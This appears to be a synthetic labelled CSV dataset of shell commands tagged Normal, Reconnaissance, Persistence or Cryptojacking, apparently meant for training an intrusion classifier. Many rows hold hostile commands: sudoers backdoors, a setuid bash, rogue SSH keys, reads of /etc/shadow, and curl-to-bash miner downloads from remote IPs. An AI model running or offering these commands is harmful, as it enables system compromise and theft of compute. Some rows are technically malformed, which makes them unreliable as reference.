command,label
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /etc/passwd,Reconnaissance
ping -c 4 45.33.32.156,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
cat /var/log/syslog | grep error,Normal
history,Normal
crontab -e,Persistence
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
sudo apt-get update && sudo apt-get upgrade,Normal
clear,Normal
cat /proc/cpuinfo; pkill -f cpuminer; wget https://github.com/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./cpuminer -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
cat /etc/passwd,Reconnaissance
clear,Normal
cat /proc/cpuinfo; pkill -f cpuminer; wget https://10.0.0.5/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./cpuminer -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
cat /etc/shadow,Reconnaissance
ping -c 4 github.com,Normal
ps aux | grep root,Reconnaissance
ps aux | grep root,Reconnaissance
chmod u+s /bin/bash,Persistence
sudo apt-get update && sudo apt-get upgrade,Normal
cat /proc/cpuinfo; pkill -f cpuminer; wget https://bitbucket.org/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./cpuminer -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
cat /proc/cpuinfo; pkill -f coinminer; wget https://github.com/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./coinminer -o minexmr.com:443' >> /etc/crontab,Cryptojacking
uname -a && id && w,Reconnaissance
cd /home/user && pwd,Normal
netstat -tulpn,Reconnaissance
ip a && route -n,Reconnaissance
chmod u+s /bin/bash,Persistence
htop,Normal
cat /proc/cpuinfo; pkill -f minerd; wget https://bitbucket.org/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./minerd -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://10.0.0.5/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./xmr-stak -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
cat /etc/shadow,Reconnaissance
chmod u+s /bin/bash,Persistence
ls -la /var/log,Normal
nohup ./xmr-stak -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
crontab -e,Persistence
sudo apt-get update && sudo apt-get upgrade,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
nohup ./xmr-stak -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
cat /proc/cpuinfo; pkill -f minerd; wget https://github.com/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./minerd -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
uname -a && id && w,Reconnaissance
nohup ./kdevtmpfsi -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
echo 'checking system logs',Normal
cd /home/user && pwd,Normal
uname -a && id && w,Reconnaissance
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
crontab -e,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
curl -s http://45.33.32.156/miner.tar.gz | bash,Cryptojacking
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
cat /proc/cpuinfo; pkill -f kdevtmpfsi; wget https://192.168.1.50/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./kdevtmpfsi -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
ping -c 4 10.0.0.5,Normal
clear,Normal
clear,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
netstat -tulpn,Reconnaissance
echo '* * * * * root /tmp/syslogd' >> /etc/crontab,Persistence
sudo apt-get update && sudo apt-get upgrade,Normal
nohup ./minerd -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
ip a && route -n,Reconnaissance
netstat -tulpn,Reconnaissance
crontab -e,Persistence
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
echo 'checking system logs',Normal
crontab -e,Persistence
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
ip a && route -n,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
ps aux | grep root,Reconnaissance
ping -c 4 10.0.0.5,Normal
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://45.33.32.156/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./xmr-stak -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
curl -s http://45.33.32.156/miner.tar.gz | bash,Cryptojacking
top -n 1,Normal
wget http://45.33.32.156/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o nanopool.org:14433,Cryptojacking
uname -a && id && w,Reconnaissance
cd /home/user && pwd,Normal
uname -a && id && w,Reconnaissance
echo 'checking system logs',Normal
cat /etc/passwd,Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
nohup ./coinminer -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
wget http://185.12.33.1/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o pool.supportxmr.com:3333,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
ps aux | grep root,Reconnaissance
curl -s http://185.12.33.1/syslogd | bash,Cryptojacking
curl -s http://45.33.32.156/miner.tar.gz | bash,Cryptojacking
ls -la /var/log,Normal
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://10.0.0.5/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./xmr-stak -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
htop,Normal
cat /etc/passwd,Reconnaissance
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
crontab -e,Persistence
echo '* * * * * root /tmp/syslogd' >> /etc/crontab,Persistence
wget http://10.0.0.5/coinminer -O /tmp/coinminer && chmod +x /tmp/coinminer && /tmp/coinminer -o minexmr.com:443,Cryptojacking
cat /etc/passwd,Reconnaissance
ps aux | grep root,Reconnaissance
ps aux | grep root,Reconnaissance
cat /etc/shadow,Reconnaissance
cat /proc/cpuinfo; pkill -f kdevtmpfsi; wget https://45.33.32.156/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./kdevtmpfsi -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
uname -a && id && w,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
ping -c 4 10.0.0.5,Normal
uname -a && id && w,Reconnaissance
whoami,Normal
chmod u+s /bin/bash,Persistence
top -n 1,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
sudo apt-get update && sudo apt-get upgrade,Normal
uname -a && id && w,Reconnaissance
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
cat /proc/cpuinfo; pkill -f cpuminer; wget https://142.250.190.46/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./cpuminer -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
ls -la /var/log,Normal
cd /home/user && pwd,Normal
ip a && route -n,Reconnaissance
htop,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
nohup ./cpuminer -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
clear,Normal
netstat -tulpn,Reconnaissance
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
top -n 1,Normal
cat /etc/shadow,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
ls -la /var/log,Normal
ping -c 4 192.168.1.50,Normal
ip a && route -n,Reconnaissance
uname -a && id && w,Reconnaissance
history,Normal
cat /proc/cpuinfo; pkill -f cpuminer; wget https://185.12.33.1/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./cpuminer -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
chmod u+s /bin/bash,Persistence
history,Normal
whoami,Normal
cat /proc/cpuinfo; pkill -f cpuminer; wget https://10.0.0.5/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./cpuminer -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
cat /etc/shadow,Reconnaissance
netstat -tulpn,Reconnaissance
htop,Normal
ping -c 4 bitbucket.org,Normal
cat /proc/cpuinfo; pkill -f coinminer; wget https://142.250.190.46/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./coinminer -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
uname -a && id && w,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
nohup ./cpuminer -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
whoami,Normal
nohup ./xmrig -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
curl -s http://10.0.0.5/cron.sh | bash,Cryptojacking
wget http://192.168.1.50/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o minexmr.com:443,Cryptojacking
history,Normal
nohup ./cpuminer -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
crontab -e,Persistence
cat /etc/shadow,Reconnaissance
whoami,Normal
clear,Normal
nohup ./minerd -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
cat /var/log/syslog | grep error,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
nohup ./xmr-stak -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
cat /etc/passwd,Reconnaissance
curl -s http://45.33.32.156/miner.tar.gz | bash,Cryptojacking
nohup ./cpuminer -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
cat /etc/passwd,Reconnaissance
curl -s http://45.33.32.156/miner.tar.gz | bash,Cryptojacking
crontab -e,Persistence
wget http://142.250.190.46/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o pool.supportxmr.com:3333,Cryptojacking
cat /var/log/syslog | grep error,Normal
top -n 1,Normal
echo 'checking system logs',Normal
cat /var/log/syslog | grep error,Normal
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
cat /etc/shadow,Reconnaissance
clear,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
wget http://github.com/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o minexmr.com:443,Cryptojacking
crontab -e,Persistence
ls -la /var/log,Normal
cat /proc/cpuinfo; pkill -f xmrig; wget https://45.33.32.156/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./xmrig -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
ls -la /var/log,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
cat /proc/cpuinfo; pkill -f coinminer; wget https://45.33.32.156/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./coinminer -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
netstat -tulpn,Reconnaissance
netstat -tulpn,Reconnaissance
chmod u+s /bin/bash,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cat /etc/shadow,Reconnaissance
netstat -tulpn,Reconnaissance
ps aux | grep root,Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
ip a && route -n,Reconnaissance
cat /var/log/syslog | grep error,Normal
ping -c 4 github.com,Normal
whoami,Normal
ps aux | grep root,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
nohup ./cpuminer -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
chmod u+s /bin/bash,Persistence
sudo apt-get update && sudo apt-get upgrade,Normal
uname -a && id && w,Reconnaissance
nohup ./cpuminer -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
curl -s http://142.250.190.46/miner.tar.gz | bash,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /proc/cpuinfo; pkill -f coinminer; wget https://185.12.33.1/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./coinminer -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
cat /proc/cpuinfo; pkill -f minerd; wget https://192.168.1.50/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./minerd -o minexmr.com:443' >> /etc/crontab,Cryptojacking
curl -s http://45.33.32.156/cron.sh | bash,Cryptojacking
ip a && route -n,Reconnaissance
ping -c 4 github.com,Normal
crontab -e,Persistence
clear,Normal
ip a && route -n,Reconnaissance
curl -s http://142.250.190.46/install.sh | bash,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
whoami,Normal
uname -a && id && w,Reconnaissance
uname -a && id && w,Reconnaissance
netstat -tulpn,Reconnaissance
chmod u+s /bin/bash,Persistence
cat /var/log/syslog | grep error,Normal
ls -la /var/log,Normal
echo 'checking system logs',Normal
netstat -tulpn,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
whoami,Normal
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
ip a && route -n,Reconnaissance
netstat -tulpn,Reconnaissance
ping -c 4 185.12.33.1,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
curl -s http://185.12.33.1/syslogd | bash,Cryptojacking
chmod u+s /bin/bash,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
whoami,Normal
ip a && route -n,Reconnaissance
wget http://185.12.33.1/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o xmrpool.eu:9000,Cryptojacking
echo 'checking system logs',Normal
ps aux | grep root,Reconnaissance
cd /home/user && pwd,Normal
uname -a && id && w,Reconnaissance
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
ip a && route -n,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
crontab -e,Persistence
cat /proc/cpuinfo; pkill -f xmrig; wget https://45.33.32.156/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./xmrig -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
clear,Normal
cat /etc/shadow,Reconnaissance
cat /etc/shadow,Reconnaissance
chmod u+s /bin/bash,Persistence
chmod u+s /bin/bash,Persistence
top -n 1,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /proc/cpuinfo; pkill -f minerd; wget https://github.com/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./minerd -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
cat /proc/cpuinfo; pkill -f xmrig; wget https://185.12.33.1/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./xmrig -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
cat /etc/shadow,Reconnaissance
cat /etc/shadow,Reconnaissance
ps aux | grep root,Reconnaissance
cat /etc/passwd,Reconnaissance
top -n 1,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
ip a && route -n,Reconnaissance
wget http://185.12.33.1/coinminer -O /tmp/coinminer && chmod +x /tmp/coinminer && /tmp/coinminer -o minexmr.com:443,Cryptojacking
echo 'checking system logs',Normal
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
whoami,Normal
wget http://github.com/minerd -O /tmp/minerd && chmod +x /tmp/minerd && /tmp/minerd -o pool.supportxmr.com:3333,Cryptojacking
echo 'checking system logs',Normal
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
wget http://185.12.33.1/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o pool.supportxmr.com:3333,Cryptojacking
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
cd /home/user && pwd,Normal
cat /etc/passwd,Reconnaissance
sudo apt-get update && sudo apt-get upgrade,Normal
ps aux | grep root,Reconnaissance
echo 'checking system logs',Normal
ps aux | grep root,Reconnaissance
wget http://bitbucket.org/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o xmrpool.eu:9000,Cryptojacking
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
sudo apt-get update && sudo apt-get upgrade,Normal
ls -la /var/log,Normal
cat /proc/cpuinfo; pkill -f kdevtmpfsi; wget https://192.168.1.50/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./kdevtmpfsi -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
top -n 1,Normal
cat /etc/passwd,Reconnaissance
echo 'checking system logs',Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
netstat -tulpn,Reconnaissance
ip a && route -n,Reconnaissance
cat /proc/cpuinfo; pkill -f xmrig; wget https://192.168.1.50/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./xmrig -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
chmod u+s /bin/bash,Persistence
cat /proc/cpuinfo; pkill -f cpuminer; wget https://192.168.1.50/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./cpuminer -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
crontab -e,Persistence
cat /proc/cpuinfo; pkill -f cpuminer; wget https://45.33.32.156/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./cpuminer -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
git clone https://192.168.1.50/repo.git && cd repo && make,Cryptojacking
netstat -tulpn,Reconnaissance
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
echo 'checking system logs',Normal
cd /home/user && pwd,Normal
crontab -e,Persistence
chmod u+s /bin/bash,Persistence
cat /etc/passwd,Reconnaissance
ls -la /var/log,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
chmod u+s /bin/bash,Persistence
cat /etc/shadow,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
uname -a && id && w,Reconnaissance
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
uname -a && id && w,Reconnaissance
cat /etc/shadow,Reconnaissance
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
curl -s http://10.0.0.5/syslogd | bash,Cryptojacking
cat /proc/cpuinfo; pkill -f cpuminer; wget https://185.12.33.1/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./cpuminer -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
clear,Normal
cat /var/log/syslog | grep error,Normal
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
